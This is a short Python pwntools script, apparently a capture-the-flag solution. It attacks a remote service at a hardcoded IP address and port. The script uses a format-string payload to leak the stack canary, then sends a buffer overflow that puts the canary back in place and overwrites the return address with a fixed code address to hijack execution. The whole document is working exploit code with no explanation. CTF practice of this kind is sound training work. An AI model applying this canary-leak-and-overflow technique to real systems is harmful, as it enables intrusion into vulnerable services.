from pwn import *

payload1 = '%11$x'

payload2 = 'A'*25

p = remote('95.216.233.106', 34995)

print p.recvuntil('? ')
p.sendline(payload1)
a = p.recvline()
print a
canary = p32(int(a.split()[4][:-1],16))
print p.recvuntil('?')
payload2+=canary
payload2+='A'*12
payload2+=p32(0x080491d2)
p.sendline(payload2)
print p.recvall()
